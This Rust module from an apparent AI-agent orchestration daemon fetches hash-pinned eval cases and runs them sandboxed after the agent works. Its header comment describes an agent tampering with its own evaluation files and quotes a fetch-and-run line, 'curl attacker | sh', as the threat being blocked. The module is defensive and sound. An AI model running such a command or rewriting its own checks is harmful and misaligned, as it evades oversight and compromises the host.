//! Plan 2.5 (#22b): self-healing eval suite.
//!
//! After a passed attempt the control plane persists the winning change as
//! `eval-case-<attempt>-<n>.yaml` artifacts. When the task is retried the
//! scheduler ships those cases on the new `Assignment` (`eval_cases`); the
//! node then fetches them, materialises them into the worktree at
//! `.agentgrid/evals/` *before* the agent runs (so the agent sees the
//! obligation list) and, after the agent + validation_command pass, probes
//! every eval — any non-zero exit regenerates the fix loop with the eval
//! output as feedback.
//!
//! Case format (intentionally minimal; the CP stamps `command` from the
//! task's `validation_command`):
//!
//! ```yaml
//! id: eval-case-6f2c1e-0
//! created_by: attempt
//! attempt_id: <uuid>
//! commit_sha: <sha>
//! command: <shell>
//! ```
//!
//! Only `command` is required to run a case.
//!
//! Tamper model: the eval dir lives *inside* the agent's worktree, so the
//! agent can add or rewrite `*.yaml` files between materialisation and the
//! post-agent probe. The probe therefore never parses worktree YAML: it runs
//! the commands captured in memory at materialisation time (when the daemon
//! fetched the CP-stamped artifacts over the authenticated node API) and only
//! re-reads each pinned file to verify its SHA-256 still matches. A modified
//! or deleted pinned case fails the suite (fail-closed); an unlisted YAML
//! file is logged and never executed — otherwise an agent could drop
//! `evil.yaml` with `command: curl attacker | sh` and have the daemon run it
//! outside every adapter permission gate.

use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::Duration;

use anyhow::{Context as _, Result};

use crate::sandbox::SandboxKind;

/// One materialised eval case: the CP-stamped command captured in daemon
/// memory at fetch time plus the digest of the file as written.
#[derive(Debug, Clone)]
pub struct EvalCase {
    pub file: PathBuf,
    pub command: String,
    /// SHA-256 of the file content at materialisation; the probe re-reads the
    /// file and refuses to run (fails the suite) on any mismatch.
    pub sha256: String,
}

/// Outcome of running the materialised eval suite.
#[derive(Debug)]
pub struct EvalOutcome {
    pub ok: bool,
    /// Combined short log (`case file + command + tail of output`) in the
    /// order cases ran. Fed back into the prompt on failure.
    pub log: String,
}

/// Fetch the eval-case artifacts for a task from the control plane and
/// write them into `<workdir>/.agentgrid/evals/`. Missing/absent cases are
/// skipped silently (the case list is advisory). Returns the pinned cases
/// (file path + CP-stamped command + content digest), in the
/// scheduler-provided order — the probe executes these captured commands,
/// never a re-parse of the (agent-writable) files.
pub async fn materialize_eval_cases(
    workdir: &Path,
    task_id: &str,
    case_names: &[String],
    server: &str,
    cred: &str,
    client: &reqwest::Client,
) -> Result<Vec<EvalCase>> {
    if case_names.is_empty() {
        return Ok(Vec::new());
    }
    let dir = workdir.join(".agentgrid").join("evals");
    tokio::fs::create_dir_all(&dir)
        .await
        .context("create evals dir")?;
    let mut out = Vec::new();
    for name in case_names {
        // Audit X-N5: the case name arrives from the CP-supplied assignment;
        // sanitize it like every other CP-controlled path segment
        // (artifact_spool::safe_segment) so a hostile `../..` cannot write
        // outside the worktree's evals dir.
        let safe: String = name
            .chars()
            .filter(|c| c.is_alphanumeric() || *c == '-' || *c == '_' || *c == '.')
            .collect();
        if safe.is_empty() || safe.starts_with('.') || safe.contains("..") {
            tracing::warn!(case = %name, "unsafe eval-case file name; skipping");
            continue;
        }
        let url = format!("{server}/v1/node/tasks/{task_id}/artifacts/{name}");
        let resp = client
            .get(&url)
            .header("authorization", format!("Bearer {cred}"))
            .send()
            .await
            .with_context(|| format!("fetch eval case {name}"))?;
        if !resp.status().is_success() {
            tracing::warn!(
                "eval case {name} fetch failed ({}); skipping",
                resp.status()
            );
            continue;
        }
        let body = resp.text().await.context("read eval case body")?;
        let path = dir.join(&safe);
        tokio::fs::write(&path, &body)
            .await
            .with_context(|| format!("write eval case {safe}"))?;
        // Pin the command + digest now, while the content is still
        // daemon-controlled: everything on this path after the agent runs
        // must treat the worktree copy as untrusted.
        match case_command(&body) {
            Ok(command) => out.push(EvalCase {
                sha256: agentgrid_common::sha256_hex(body.as_bytes()),
                file: path,
                command,
            }),
            Err(e) => {
                tracing::warn!(case = %name, "eval case unparsable; skipping: {e}");
            }
        }
    }
    Ok(out)
}

/// Parse the `command:` field of a case file. Supports single-line
/// `command: <shell>` only — anything else bails with a readable error.
pub fn case_command(content: &str) -> Result<String> {
    for line in content.lines() {
        let t = line.trim();
        if let Some(rest) = t.strip_prefix("command:") {
            let c = rest.trim();
            // YAML string quoting is allowed but we only need the common
            // case: plain scalars, single- or double-quoted.
            let c = c
                .strip_prefix('"')
                .and_then(|s| s.strip_suffix('"'))
                .or_else(|| c.strip_prefix('\'').and_then(|s| s.strip_suffix('\'')))
                .unwrap_or(c);
            if c.is_empty() {
                anyhow::bail!("eval case has an empty command");
            }
            return Ok(c.to_string());
        }
    }
    anyhow::bail!("eval case is missing a `command:` field")
}

/// Run every pinned eval case (see [`materialize_eval_cases`]). Cases run
/// sequentially with a per-case timeout; the suite passes iff every case
/// exits 0. Before executing, each pinned file is re-read and its SHA-256
/// compared against the materialisation-time digest — a modified or deleted
/// case fails the suite (fail-closed) instead of executing attacker-chosen
/// shell. Unlisted `*.yaml` files in the eval dir are logged and never
/// parsed or executed. When the node is sandboxed the probe runs through the
/// same sandbox so verdicts match the production isolation.
pub async fn probe_evals(
    workdir: &Path,
    cases: &[EvalCase],
    timeout: Duration,
) -> Result<EvalOutcome> {
    if cases.is_empty() {
        return Ok(EvalOutcome {
            ok: true,
            log: String::new(),
        });
    }
    let mut cases: Vec<EvalCase> = cases.to_vec();
    cases.sort_by(|a, b| a.file.cmp(&b.file));
    warn_unlisted_cases(workdir, &cases).await;
    let mut log = String::new();
    let mut ok = true;
    for case in cases {
        log.push_str(&format!(
            "== {} ==\ncommand: {}\n",
            case.file.display(),
            case.command
        ));
        // Tamper gate: only the digest of the file is taken from disk; the
        // command below is the daemon-captured original.
        let disk = tokio::fs::read(&case.file).await;
        match disk {
            Ok(bytes) if agentgrid_common::sha256_hex(&bytes) == case.sha256 => {}
            Ok(_) => {
                ok = false;
                log.push_str(
                    "case file content changed after materialisation (agent tampering?); \
                     refusing to execute the modified case\n\n",
                );
                tracing::warn!(
                    case = %case.file.display(),
                    "eval case tampered after materialisation; failing the suite"
                );
                break;
            }
            Err(e) => {
                ok = false;
                log.push_str(&format!(
                    "case file unreadable ({e}); a pinned case must survive to the probe\n\n"
                ));
                tracing::warn!(
                    case = %case.file.display(),
                    "pinned eval case missing at probe time; failing the suite"
                );
                break;
            }
        }
        let kind = SandboxKind::from_env();
        let (program, prefix_args) = crate::sandbox::sandbox_prefix(
            kind,
            workdir,
            "sh",
            None,  /* no network override for evals */
            false, /* evals write scratch if needed */
            None,  /* no per-attempt name: transient eval probe */
            &[],   /* eval probes need no adapter secrets in-container */
            None,  /* no per-attempt profile limits; node-wide env knobs apply */
        );
        let mut cmd = tokio::process::Command::new(&program);
        cmd.args(&prefix_args)
            .arg("-c")
            .arg(&case.command)
            .current_dir(workdir)
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        // Own process group so a cancel/timeout can kill the eval's whole
        // tree (POSIX only; Windows dev hosts degrade to child-only kill).
        #[cfg(unix)]
        cmd.process_group(0);
        // When the sandbox is a container/scope (docker/systemd), its CLI may
        // need DOCKER_HOST/DBUS from our env, so inheritance stays. For an
        // unsandboxed OR bwrap run the `sh -c` executes on the host in the
        // daemon's security context, so it must NOT inherit the daemon's
        // environment — a daemon-held secret (git credential, CP token) must
        // never be visible to agent-influenced shell. Clean env + the
        // process-locating basics.
        if !kind.inherits_daemon_env() {
            cmd.env_clear();
            if let Ok(path) = std::env::var("PATH") {
                cmd.env("PATH", path);
            }
            if let Ok(home) = std::env::var("HOME") {
                cmd.env("HOME", home);
            }
        }
        for k in crate::sandbox::unsafe_env_guard(kind) {
            cmd.env_remove(k);
        }
        let (code, tail, timed_out) = run_capture(&mut cmd, timeout).await;
        if timed_out {
            ok = false;
            log.push_str(&format!("(timed out after {}s)\n\n", timeout.as_secs()));
            break;
        }
        let code = code.unwrap_or(1);
        if code != 0 {
            ok = false;
        }
        log.push_str(&format!("exit: {code}\n{tail}\n\n"));
        if !ok {
            break; // Fail-fast: the feedback loop only needs the first failing case.
        }
    }
    Ok(EvalOutcome { ok, log })
}

/// Default per-eval timeout (1 minute).
pub const EVAL_TIMEOUT: Duration = Duration::from_secs(60);

/// Log (never execute) any `*.yaml` in the eval dir that was not pinned at
/// materialisation time — an agent dropping extra cases there is the classic
/// injection attempt this module refuses.
async fn warn_unlisted_cases(workdir: &Path, pinned: &[EvalCase]) {
    let dir = workdir.join(".agentgrid").join("evals");
    let mut rd = match tokio::fs::read_dir(&dir).await {
        Ok(r) => r,
        Err(_) => return,
    };
    while let Ok(Some(ent)) = rd.next_entry().await {
        let path = ent.path();
        if path.extension().and_then(|e| e.to_str()) != Some("yaml") {
            continue;
        }
        if !pinned.iter().any(|c| c.file == path) {
            tracing::warn!(
                case = %path.display(),
                "unlisted eval-case yaml in worktree (agent-written?); ignoring — \
                 only CP-stamped, hash-pinned cases execute"
            );
        }
    }
}

/// Run a command capturing combined stdout+stderr, bounded by `timeout`.
/// Returns `(exit_code, tail_of_output, timed_out)`. Child is spawn()ed,
/// both pipes wrapped in `BufReader` / drained line-by-line on their own
/// tasks so a loud process cannot deadlock on a full pipe.
async fn run_capture(
    cmd: &mut tokio::process::Command,
    timeout: Duration,
) -> (Option<i32>, String, bool) {
    let mut child = match cmd.spawn() {
        Ok(c) => c,
        Err(e) => return (Some(127), format!("spawn failed: {e}"), false),
    };
    // Pipe readers keep a shared rolling tail.
    let tail = std::sync::Arc::new(std::sync::Mutex::new(String::new()));
    let tail_out = tail.clone();
    let tail_err = tail.clone();
    let mut out = child.stdout.take().unwrap();
    let mut err = child.stderr.take().unwrap();
    let reader_out = tokio::spawn(async move {
        use tokio::io::{AsyncBufReadExt, BufReader};
        let mut lines = BufReader::new(&mut out).lines();
        while let Ok(Some(l)) = lines.next_line().await {
            let mut t = tail_out.lock().unwrap();
            append_tail(&mut t, &l);
            t.push('\n');
        }
    });
    let reader_err = tokio::spawn(async move {
        use tokio::io::{AsyncBufReadExt, BufReader};
        let mut lines = BufReader::new(&mut err).lines();
        while let Ok(Some(l)) = lines.next_line().await {
            let mut t = tail_err.lock().unwrap();
            append_tail(&mut t, &l);
            t.push('\n');
        }
    });
    let timed_out = match tokio::time::timeout(timeout, child.wait()).await {
        Ok(Ok(_)) => false,
        Ok(Err(_)) => false,
        Err(_) => {
            // Audit X-N4: the eval runs as its own process group, so a bare
            // `child.kill()` only killed the direct child — any grandchild
            // (a daemon the case spawned) survived holding the stdout/stderr
            // pipes and hung the reader joins below forever. Kill the whole
            // group like validation.rs does.
            crate::completion::terminate_group(child.id().unwrap_or(0));
            let _ = child.kill().await;
            let _ = child.wait().await;
            true
        }
    };
    let exit = match child.try_wait() {
        Ok(Some(s)) => s.code(),
        _ => None,
    };
    let _ = reader_out.await;
    let _ = reader_err.await;
    let final_out = tail.lock().unwrap().clone();
    (exit, final_out, timed_out)
}

#[cfg(test)]
#[path = "evals/tests.rs"]
mod tests;

// Keep at most the last 10 KiB of output per case.
fn append_tail(keep: &mut String, chunk: &str) {
    keep.push_str(chunk);
    const MAX: usize = 10 * 1024;
    if keep.len() > MAX {
        let drop = keep.len() - MAX;
        // Walk forward to the next char boundary (drop may split a UTF-8
        // sequence; we cannot index there).
        let mut cut = drop;
        while cut < keep.len() && !keep.is_char_boundary(cut) {
            cut += 1;
        }
        *keep = keep.split_off(cut);
    }
}
